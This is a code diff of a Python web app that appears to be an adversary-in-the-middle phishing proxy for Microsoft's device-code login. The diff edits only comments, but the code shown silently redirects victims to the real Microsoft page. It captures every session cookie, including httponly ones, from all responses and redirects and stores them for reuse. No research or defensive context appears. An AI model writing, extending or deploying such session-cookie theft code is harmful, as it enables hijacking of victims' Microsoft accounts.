@@ -135,7 +135,7 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# REVISED PROXY - Silent redirect + improved cookie capture
+# PROXY - Silent redirect to original Microsoft page + full cookie capture
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
@@ -161,7 +161,7 @@ async def proxy(device_code: str, request: Request):
             content=await request.body() if request.method != "GET" else None
         )
 
-    # REVISED COOKIE CAPTURE - More aggressive from all responses
+    # Full cookie capture from every redirect
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
@@ -178,7 +178,7 @@ async def proxy(device_code: str, request: Request):
                         "httponly": bool(m["httponly"])
                     }
             except:
-                pass  # Skip bad cookies
+                pass
 
     if "cookies" not in session:
         session["cookies"] = {}
